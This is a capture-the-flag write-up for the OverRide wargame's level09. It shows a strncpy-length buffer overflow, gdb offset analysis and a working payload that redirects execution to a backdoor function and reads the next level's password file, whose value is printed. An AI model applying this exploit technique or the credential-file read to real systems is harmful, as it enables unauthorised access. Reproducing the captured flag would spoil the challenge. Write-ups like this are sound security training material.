# level09
## Program behaviour

1. Ask for `username`
2. Copy `41` bytes from `username` to `buffer + 140`
3. Ask for `message`
4. Copy `(size_t)buffer[180]` bytes from `message` to `buffer`


## Vulnerability

For some reason the program uses `buffer[180]` to determine the size to `strncpy` the `message` to `buffer`.
So if `buffer[180]` is a big number, for instance `255`, the program will buffer-overflow when copying the content of `message`.
Another helpful function is the function `secret_backdoor` located at `0x000055555555488c`. This function is not called anywhere in the program but if we manage to jump to it, then the program will run `system`.

## Exploitation

1. Find the offset from `buffer` to saved `$rip`
```gdb
(gdb) disas handle_msg 
Dump of assembler code for function handle_msg:
   0x00005555555548c0 <+0>:	push   %rbp
   0x00005555555548c1 <+1>:	mov    %rsp,%rbp
   0x00005555555548c4 <+4>:	sub    $0xc0,%rsp
   0x00005555555548cb <+11>:	lea    -0xc0(%rbp),%rax
   0x00005555555548d2 <+18>:	add    $0x8c,%rax
   0x00005555555548d8 <+24>:	movq   $0x0,(%rax)
   0x00005555555548df <+31>:	movq   $0x0,0x8(%rax)
   0x00005555555548e7 <+39>:	movq   $0x0,0x10(%rax)
   0x00005555555548ef <+47>:	movq   $0x0,0x18(%rax)
   0x00005555555548f7 <+55>:	movq   $0x0,0x20(%rax)
   0x00005555555548ff <+63>:	movl   $0x8c,-0xc(%rbp)
   0x0000555555554906 <+70>:	lea    -0xc0(%rbp),%rax # loading buffer here
   0x000055555555490d <+77>:	mov    %rax,%rdi
   0x0000555555554910 <+80>:	callq  0x5555555549cd <set_username>
   0x0000555555554915 <+85>:	lea    -0xc0(%rbp),%rax
   0x000055555555491c <+92>:	mov    %rax,%rdi
   0x000055555555491f <+95>:	callq  0x555555554932 <set_msg>
   0x0000555555554924 <+100>:	lea    0x295(%rip),%rdi        # 0x555555554bc0
   0x000055555555492b <+107>:	callq  0x555555554730 <puts@plt>
   0x0000555555554930 <+112>:	leaveq 
   0x0000555555554931 <+113>:	retq   
End of assembler dump.
End of assembler dump.
(gdb) b *0x000055555555490d
Breakpoint 1 at 0x55555555490d
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level09/level09 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------

Breakpoint 1, 0x000055555555490d in handle_msg ()
(gdb) p/d ($rbp + 8) - ($rbp - 0xc0)
$1 = 200
```

2. Knowing that there is `200` bytes from `buffer` to saved `$rip`, we can start crafting the exploit.
    - Set `buffer[180]` to `0xff`
    - Write `200` bytes to `buffer`
    - Overwrite saved `$rip` with `0x000055555555488c`
    - Read the content of `/home/users/end/.pass`
```sh
level09@OverRide:~$ (python -c 'print "\xff" * 41 + "\n" + "\x90" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00\n" + "cat /home/users/end/.pass"') | ~/level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```